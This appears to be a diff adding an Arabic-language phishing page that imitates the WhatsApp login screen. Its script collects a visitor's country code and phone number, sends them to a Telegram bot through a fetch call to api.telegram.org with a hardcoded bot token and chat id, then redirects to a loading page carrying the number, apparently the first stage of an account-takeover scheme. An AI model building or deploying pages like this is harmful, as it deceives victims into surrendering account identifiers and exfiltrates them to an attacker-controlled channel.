@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp تسجيل الدخول</title>
+<style>
+body {background:#e5ddd5;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
+.container {background:#fff;padding:30px;border-radius:15px;box-shadow:0 4px 12px rgba(0,0,0,0.2);width:340px;text-align:center;}
+h2 {color:#075E54;margin-bottom:20px;}
+select,input,button {width:100%;padding:12px;margin:10px 0;border-radius:7px;border:1px solid #ccc;font-size:16px;}
+button {background:#25D366;color:#fff;border:none;cursor:pointer;font-weight:bold;}
+button:hover {background:#128C7E;}
+</style>
+</head>
+<body>
+<div class="container">
+<h2>تسجيل الدخول إلى WhatsApp</h2>
+<form id="whatsappForm">
+    <select id="countryCode"></select>
+    <input type="tel" id="phoneNumber" placeholder="رقم الهاتف">
+    <button type="submit">متابعة</button>
+</form>
+</div>
+<script>
+const botToken = "BOT_TOKEN_HERE"; // ← حط التوكن هنا
+const chatId = "CHAT_ID_HERE";     // ← حط الشات آي دي هنا
+
+var countries = [
+  { code: "MA", name: "🇲🇦 المغرب", dial: "+212" },
+  { code: "DZ", name: "🇩🇿 الجزائر", dial: "+213" },
+  { code: "TN", name: "🇹🇳 تونس", dial: "+216" },
+  { code: "EG", name: "🇪🇬 مصر", dial: "+20" },
+  { code: "SA", name: "🇸🇦 السعودية", dial: "+966" },
+  { code: "AE", name: "🇦🇪 الإمارات", dial: "+971" },
+  { code: "QA", name: "🇶🇦 قطر", dial: "+974" },
+  { code: "KW", name: "🇰🇼 الكويت", dial: "+965" },
+  { code: "BH", name: "🇧🇭 البحرين", dial: "+973" },
+  { code: "OM", name: "🇴🇲 عمان", dial: "+968" },
+  { code: "JO", name: "🇯🇴 الأردن", dial: "+962" },
+  { code: "LB", name: "🇱🇧 لبنان", dial: "+961" },
+  { code: "IQ", name: "🇮🇶 العراق", dial: "+964" },
+  { code: "YE", name: "🇾🇪 اليمن", dial: "+967" },
+  { code: "SD", name: "🇸🇩 السودان", dial: "+249" },
+  { code: "LY", name: "🇱🇾 ليبيا", dial: "+218" },
+  { code: "PS", name: "🇵🇸 فلسطين", dial: "+970" }
+];
+
+let select = document.getElementById("countryCode");
+countries.forEach(c => {
+  let option = document.createElement("option");
+  option.value = c.dial;
+  option.textContent = `${c.name} (${c.dial})`;
+  select.appendChild(option);
+});
+
+document.getElementById("whatsappForm").addEventListener("submit", function(e){
+  e.preventDefault();
+  let phone = document.getElementById("phoneNumber").value;
+  let code = document.getElementById("countryCode").value;
+  let fullNumber = code + phone;
+
+  // إرسال الرقم للبوت
+  fetch(`https://api.telegram.org/bot$8246433435:AAELqIGlOHhej7uQN7kxZQLAaDq_xLGvooo/sendMessage?chat_id=$1891742408&text=${encodeURIComponent("رقم الهاتف: "+fullNumber)}`);
+
+  // الانتقال لصفحة التحميل مع تمرير الرقم
+  window.location.href = "loading.html?phone=" + encodeURIComponent(fullNumber);
+});
+</script>
+</body>
+</html>
